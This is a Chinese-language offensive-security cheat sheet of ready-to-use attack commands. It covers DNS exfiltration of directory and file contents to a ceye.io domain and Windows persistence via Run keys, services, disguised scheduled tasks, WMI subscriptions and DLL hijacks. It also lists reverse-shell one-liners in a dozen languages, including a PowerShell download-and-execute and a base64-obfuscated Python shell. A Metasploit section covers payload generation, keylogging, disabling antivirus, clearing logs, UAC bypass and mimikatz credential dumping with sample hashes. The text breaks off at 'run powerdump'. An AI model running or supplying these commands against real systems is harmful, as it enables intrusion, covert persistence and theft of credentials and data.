//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。
//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。
//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
//%PATH%                   系统       指定可执行文件的搜索路径。
//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。
//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。
//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。
//%PROCESSOR_REVISION%     系统       返回处理器的版本号。
//%P ROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。
//%TEMP%和%TMP%            系统和用户  返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
//%TIME%                   系统       返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。
//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。
//%USERNAME%               本地       返回当前登录的用户的名称。
//%USERPROFILE%            本地       返回当前用户的配置文件的位置。
//%WINDIR%                 系统       返回操作系统目录的位置。
```
#### Linux
在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。
```
ping pwd|tr -d '\n'|xxd -ps.is1lv6.ceye.io
```
base64原理和上面类似，主要是对值进行base64编码，然后替换掉“=”，即可成功外带数据。
```
pingpwd|base64|tr -d ‘=’.is1lv6.ceye.io
```
如果有多行数据需要外带，那么请考虑下面的语句。
```
var=11111 && for b in $(find / -name "index.php" | xargs grep "111222"|xxd -p); do var=$((var+1)) && dig $var.$b.is1lv6.ceye.io; done
```



## windows权限维持

### Startup目录
```
NT6以后的目录如下：

对当前用户有效：
C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
对所有用户有效：
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
NT6以前的目录如下：

对当前用户有效：
C:\Documents and Settings\Hunter\「开始」菜单\程序\启动
对所有用户有效：
C:\Documents and Settings\All Users\「开始」菜单\程序\启动

```
### 注册键

```
reg add "XXXX" /v evil /t REG_SZ /d "[Absolute Path]\evil.exe"
```

```
1.Load注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load

2.Userinit注册键
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit
通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。

3.Explorer＼Run注册键
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。

4.RunServicesOnce注册键
RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce

5.RunServices注册键
RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices

6.RunOnce＼Setup注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup

7.RunOnce注册键
安装程序通常用RunOnce键自动运行程序，它的位置在
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。

8.Run注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。
```

### 服务
```
sc create evil binpath= "cmd.exe /k [Absolute Path]evil.exe" start= "auto" obj= "LocalSystem"
```

### 计划任务

注意：C:\programData目录默认是隐藏的
```

SYSTEM 权限，开机自启

SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\Update\task1 /TR C:\programData\update.exe /F

晚上23：45执行
SCHTASKS /Create /RU SYSTEM /RL HIGHEST /SC DAILY /TN \Microsoft\Windows\Update\task2 /TR "C:\programData\update.exe" /ST 23:45 /F


查询
SCHTASKS /query
C:\\Windows\\System32\\schtasks.exe /query


```

### WMI事件

```
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="evil", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 310"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="evilConsumer", ExecutablePath="C:\Users\hunter\Desktop\beacon.exe",CommandLineTemplate="C:\Users\hunter\Desktop\beacon.exe"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"evil\"", Consumer="CommandLineEventConsumer.Name=\"evilConsumer\""

```

### 屏幕保护

```
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f
reg add "hkcu\control panel\desktop" /v ScreenSaveActive /d 1 /f
reg add "hkcu\control panel\desktop" /v ScreenSaverIsSecure /d 0 /f
reg add "hkcu\control panel\desktop" /v ScreenSaveTimeOut /d 60 /f
```

### bitsadmin
```
bitsadmin /create evil
bitsadmin /addfile evil "C:\Users\hunter\Desktop\beacon.exe" "C:\Users\hunter\Desktop\beacon.exe"
bitsadmin.exe /SetNotifyCmdLine evil "C:\Users\hunter\Desktop\beacon.exe" NUL
bitsadmin /Resume evil
```

### Netsh白加黑

```
可以通过导入helperdll的方式做权限维持，命令格式如下：
netsh add helper [Absolute evil DLL path]
但是由于netsh并不会开启自启动，因此还要再写一条自启动项：
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "cmd /c C:\Windows\System32\netsh"
重新启动后依然可获得shell：
```

### MSDTC

在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。
默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：
```
sc qc msdtc
sc config msdtc start= auto

```





# 反弹shell(流量太敏感，尽量加密用)

## nc

```
nc -lvvp 4444
```

## bash

```
bash -i >& /dev/tcp/172.16.1.130/4444 0>&1
exec 5<>/dev/tcp/172.16.1.130/4444;cat <&5|while read line;do $line >&5 2>&1;done
```

## perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.41",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## php

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## nc

```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
```

## java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## lua

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## powershell

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444
```

## 加密shell
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.100:2333 > /tmp/s; rm /tmp/s

```

# msf大全



https://xz.aliyun.com/t/2536

https://www.freebuf.com/articles/web/270456.html

https://saucer-man.com/information_security/79.html

https://www.anquanke.com/post/id/235631

https://www.anquanke.com/post/id/164525



## 安装

安装

```bash
# 安装
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
安装目录 
# /opt/metasploit-framework/embedded/framework/
```

安装2
```
wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
chmod +x ./metasploit-latest-linux-x64-installer.run
./metasploit-latest-linux-x64-installer.run
```

### payload生成

Linux

```bash
反向连接：
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f elf > shell.elf
正向连接：
msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=808 -f elf > shell.elf
```

Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f exe > shell.exe
```

Mac

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f macho > shell.macho
```

PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f asp > shell.asp
```

JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f raw > shell.jsp
```

WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f war > shell.war
```

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：

```bash
php shell.php
```

3.脚本shell

Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=808 -f raw > shell.py
```

Bash

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=127.0.0.1 LPORT=808 -f raw > shell.sh
```

Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=127.0.0.1 LPORT=808 -f raw > shell.pl
```

执行方式：复制shell.py中的内容在linux命令行下执行：

```
python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"
```

4.shellcode
Linux Based Shellcode

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f <language>
```

Windows Based Shellcode

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f <language>
```

Mac Based Shellcode

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f <language>
```


```

Framework Executable Formats [--format <value>]
===============================================

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    ducky-script-psh
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war



Framework Transform Formats [--format <value>]
==============================================

    Name
    ----
    base32
    base64
    bash
    c
    csharp
    dw
    dword
    go
    golang
    hex
    java
    js_be
    js_le
    masm
    nim
    nimlang
    num
    octal
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    rust
    rustlang
    sh
    vbapplication
    vbscript
    zig
```



## Meterpreter基本命令

首先需要先获取meterpreter：

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
#set payload linux/x64/meterpreter/reverse_tcp
#set payload cmd/unix/reverse_bash
set LHOST 0.0.0.0
set lPORT 6789
set ExitOnSession false
exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)
jobs  # 查看后台攻击任务 
kill <id>  # 停止某后台攻击任务 
sessions -l  # (查看会话)
sessions -i 2   # 选择会话
sessions -k 2   # 结束会话
```

如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用`sessions-u 2`来将cmdshell升级成meterpreter。

获取到了meterpreter，就可以进行后渗透了。

### 基本系统命令

```bash
# 会话管理
background  #将当前会话放置后台
sessions  # 查看会话
sessions -i  # 切换会话
quit  # 关闭当前的会话，返回msf终端

# 系统设置
sysinfo  # 查看目标机系统信息
idletime  # 查看目标机闲置时间
reboot/shutdown   # 重启/关机

# shell
shell  # 获得控制台权限
irb  # 进入ruby终端

# 进程迁移
getpid    # 获取当前进程的pid
ps   # 查看当前活跃进程
migrate <pid值>    #将Meterpreter会话移植到指定pid值进程中
kill <pid值>   #杀死进程
migrate <pid值>    #将Meterpreter会话移植到指定pid值进程中

# 执行文件
execute #在目标机中执行文件
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互

# 摄像头命令
webcam_list  #查看摄像头列表
webcam_chat  # 查看摄像头接口
webcam_snap   #通过摄像头拍照
webcam_stream   #通过摄像头开启视频

# uictl开关键盘/鼠标
uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标
uictl disable mouse  #禁用鼠标
uictl disable keyboard  #禁用键盘

# 远程桌面/截屏
enumdesktops  #查看可用的桌面
getdesktop    #获取当前meterpreter 关联的桌面
screenshot  #截屏
use espia  #或者使用espia模块截屏  然后输入screengrab
run vnc  #使用vnc远程桌面连接

# 键盘记录
keyscan_start  #开始键盘记录
keyscan_dump   #导出记录数据
keyscan_stop #结束键盘记录

# 添加用户，开启远程桌面
# 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令
run post/windows/manage/enable_rdp  #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662

# 关闭防病毒软件
run killav
run post/windows/manage/killav

# 修改注册表
reg –h # 注册表命令帮助
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe' #设置键值
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值
nc -v 192.168.81.162 443  #攻击者连接nc后门

# 清理日志
clearav  #清除windows中的应用程序日志、系统日志、安全日志
```

###  文件系统命令

```bash
cat/ls/cd/rm  # 基本命令
search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助
getwd/pwd  # 获取当前目录
getlwd/lpwd   # 操作攻击者主机 查看当前目录
upload /tmp/hack.txt C:\\lltest # 上传文件
download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件
edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件
mkdir lltest2  # 只能在当前目录下创建文件夹
rmdir lltest2  # 只能删除当前目录下文件夹
lcd /tmp   # 操作攻击者主机 切换目录

# timestomp伪造文件时间戳
timestomp C:// -h   #查看帮助
timestomp -v C://2.txt   #查看时间戳
timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
```

### 网络命令

```bash
# 基本
ipconfig/ifconfig
netstat –ano
arp
getproxy   #查看代理信息
route   #查看路由

# portfwd端口转发
portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口
rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码


# 添加路由

# 方式一autoroute （deprecated）
run autoroute –h #查看帮助
run autoroute -s 192.168.2.0/24  #添加到目标环境网络
run autoroute –p  #查看添加的路由

# 方式二post/multi/manage/autoroute
run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络
run post/multi/manage/autoroute CMD=print # 查看添加的路由
(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))

# 然后可以利用arp_scanner、portscan等进行存活检测
run arp_scanner -r 192.168.2.0/24
run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24
run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0

# autoroute添加完路由后，还可以利用msf自带的模块进行socks代理
# msf提供了2个模块用来做socks代理。
# auxiliary/server/socks_proxy
# use auxiliary/server/socks_unc
# 先background退出来，然后：
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set srvport 1080
run

# 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080
# 最后proxychains 使用Socks5代理访问

# sniffer抓包
use sniffer
sniffer_interfaces   #查看网卡
sniffer_start 2   #选择网卡 开始抓包
sniffer_stats 2   #查看状态
sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包
sniffer_stop 2   #停止抓包
```

###  信息收集

```bash
# 信息收集的脚本位于：
# modules/post/windows/gather
# modules/post/linux/gather
# 以下列举一些常用的
run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum_drives #查看分区
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum_ie  #获取IE缓存
run post/windows/gather/enum_chrome   #获取Chrome缓存
run post/windows/gather/enum_patches  #补丁信息
run post/windows/gather/enum_domain  #查找定位域控
run post/windows/gather/enum_logged_on_users  #登录过的用户
```

### 提权

1.getsystem提权
getsystem工作原理：
①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。
②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。
③Windows服务已启动，导致与命名管道建立连接。
④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。
然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。

```bash
getsystem  
```

2.bypassuac
用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。

msf提供了如下几个模块帮助绕过UAC：

```bash
msf5 auxiliary(server/socks5) > search bypassuac

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
```

使用方法类似，运行后返回一个新的会话，**需要再次执行getsystem获取系统权限**

```bash
# 示例
meterpreter > getuid
Server username: SAUCERMAN\TideSec
meterpreter > background
[*] Backgrounding session 4...
msf5 exploit(multi/handler) >  use exploit/windows/local/bypassuac
msf5 exploit(windows/local/bypassuac) > set SESSION 4
SESSION => 4
msf5 exploit(windows/local/bypassuac) > run

[-] Handler failed to bind to 192.168.81.160:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (206403 bytes) to 192.168.81.154
[*] Meterpreter session 5 opened (192.168.81.160:4444 -> 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700
[-] Exploit failed [timeout-expired]: Timeout::Error execution expired
[*] Exploit completed, but no session was created.

# 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功
# 然鹅这里失败了
```

3.内核漏洞提权

无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。

```bash
meterpreter > run post/windows/gather/enum_patches  #查看补丁信息
msf5 > use exploit/windows/local/ms13_053_schlamperei
msf5 > set SESSION 2
msf5 > exploit

# 示例
meterpreter > run post/windows/gather/enum_patches

[+] KB2871997 is missing
[+] KB2928120 is missing
[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
meterpreter > background
[*] Backgrounding session 4...
msf5 exploit(windows/local/bypassuac) > search MS13-081

Matching Modules
================

   #  Name                                             Disclosure Date  Rank     Check  Description
   -  ----                                             ---------------  ----     -----  -----------
   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page


msf5 exploit(windows/local/bypassuac) > use exploit/windows/local/ms13_081_track_popup_menu
msf5 exploit(windows/local/ms13_081_track_popup_menu) > set session 4
session => 4
msf5 exploit(windows/local/ms13_081_track_popup_menu) > exploit

[!] SESSION may not be compatible with this module.
[-] Handler failed to bind to 192.168.81.160:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported
[*] Exploit completed, but no session was created.
# 然鹅失败了，摸摸头
```

###  获取凭证

在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。

1.使用mimikatz

```bash
load mimikatz    #help mimikatz 查看帮助
wdigest  #获取Wdigest密码
mimikatz_command -f samdump::hashes  #执行mimikatz原始命令
mimikatz_command -f sekurlsa::searchPasswords

# 示例
meterpreter > load mimikatz
Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
Success.
meterpreter > wdigest
[!] Not currently running as SYSTEM
[*] Attempting to getprivs ...
[+] Got SeDebugPrivilege.
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain        User           Password
------    -------    ------        ----           --------
0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
0;996     Negotiate  WORKGROUP     SAUCERMAN$     
0;48748   NTLM                                    
0;999     NTLM       WORKGROUP     SAUCERMAN$     
0;476238  NTLM       SAUCERMAN     TideSec        123456
0;476209  NTLM       SAUCERMAN     TideSec        123456

meterpreter > mimikatz_command -f samdump::hashes
Ordinateur : saucerman
BootKey    : 691cff33caf49e933be97fcee370256a
RegOpenKeyEx SAM : (0x00000005) �ݿ� 
Erreur lors de l'exploration du registre
meterpreter > mimikatz_command -f sekurlsa::searchPasswords
[0] { TideSec ; SAUCERMAN ; 123456 }
[1] { TideSec ; SAUCERMAN ; 123456 }
[2] { SAUCERMAN ; TideSec ; 123456 }
[3] { SAUCERMAN ; TideSec ; 123456 }
[4] { TideSec ; SAUCERMAN ; 123456 }
[5] { TideSec ; SAUCERMAN ; 123456 }
```

1. 使用meterpreter的run hashdump命令

```bash
meterpreter > run hashdump

[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Dumping password hints...

TideSec:"123456"

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
```

3.post/windows/gather/smart_hashdump

从上面也可以看出官方推荐`post/windows/gather/smart_hashdump`

```bash
meterpreter > run post/windows/gather/smart_hashdump

[*] Running module against SAUCERMAN
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*]     Obtaining the boot key...
[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
[*]     Obtaining the user list and keys...
[*]     Decrypting user keys...
[*]     Dumping password hints...
[+]     TideSec:"123456"
[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
```

4.powerdump
同 hashdump，但失败了

```bash
meterpreter > run powerdump
